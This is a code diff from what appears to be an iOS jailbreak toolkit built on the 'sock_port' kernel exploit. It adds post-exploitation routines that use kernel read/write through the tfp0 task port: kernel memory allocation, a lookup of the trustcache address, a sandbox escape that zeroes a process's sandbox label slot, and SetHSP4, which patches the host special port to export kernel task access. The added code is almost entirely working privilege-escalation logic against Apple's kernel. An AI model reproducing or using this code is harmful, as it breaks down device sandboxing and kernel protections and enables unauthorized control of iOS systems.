@@ -7,7 +7,6 @@
 
 #include "krw.h"
 #include "sock_port/exploit.h"
-#include "sock_port/exploit.h"
 
 static task_t tfp0 = MACH_PORT_NULL;
 static uint64_t kslide = 0;
@@ -110,6 +109,16 @@ uint64_t getProcByName(char* nm) {
     return 0;
 }
 
+int getPidByName(char* nm) {
+    return kread32(getProcByName(nm) + PROC_P_PID_OFF);
+}
+
+uint64_t kalloc_(vm_size_t size) {
+    mach_vm_address_t address = 0;
+    mach_vm_allocate(tfp0, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
+    return address;
+}
+
 kern_return_t kread_buf(uint64_t addr, void *buf, size_t sz) {
     mach_vm_address_t p = (mach_vm_address_t)buf;
     mach_vm_size_t read_sz, out_sz = 0;
@@ -191,4 +200,57 @@ unsigned long kstrlen(uint64_t string) {
         i++;
     }
     return len;
+}
+
+uint64_t getTrustcache() {
+    return TRUSTCACHE + kslide;
+}
+
+bool escapeSandboxForProcess(pid_t pid){
+    uint64_t proc = getProc(pid);
+    uint64_t creds = kread64(proc + PROC_P_PID_UCRED_OFF);
+    uint64_t label = kread64(creds + UCRED_CR_LABEL);
+    kwrite64(label + SANDBOX_SLOT_OFF, 0);
+    
+    if(kread64(label + SANDBOX_SLOT_OFF) == 0) {
+        return true;
+    }
+    return false;
+}
+
+bool SetHSP4(mach_port_t tfp0) {
+    // check if we already exported tfp0
+    mach_port_t myself = mach_host_self();
+    mach_port_t okthen = MACH_PORT_NULL;
+    host_get_special_port(myself, HOST_LOCAL_NODE, 4, &okthen);
+    mach_port_deallocate(mach_task_self_, myself);
+    if(MACH_PORT_VALID(okthen)) {
+        NSLog(@"tfp0 already exported!");
+        mach_port_destroy(mach_task_self_, okthen);
+        return true;
+    }
+    
+    // get our host, and host port
+    mach_port_t host_self = mach_host_self();
+    uint64_t host_port = find_port(host_self, task_self_addr());
+    uint64_t hsp4 = find_port(tfp0, task_self_addr());
+    NSLog(@"HSP4: 0x%llx", hsp4);
+    
+    // Set hsp4
+    kwrite32(host_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), io_makebits(1, IOT_PORT, IKOT_HOST_PRIV));
+    uint64_t realhost = rk64(host_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    kwrite64(realhost + 0x10 + 4 * sizeof(uint64_t), hsp4); // 0x10 = OFFSET(host, special)
+    
+    // check if we successfully set hsp4
+    mach_port_t test = MACH_PORT_NULL;
+    host_get_special_port(host_self, HOST_LOCAL_NODE, 4, &test);
+    mach_port_deallocate(mach_task_self_, host_self);
+    if(!MACH_PORT_VALID(test)) {
+        NSLog(@"[set hsp4] ERR: Couldn't set HSP4 port!");
+        return false;
+    }
+    
+    NSLog(@"[set hsp4] Exported tfp0 to HSP4");
+    mach_port_destroy(mach_task_self_, test);
+    return true;
 }
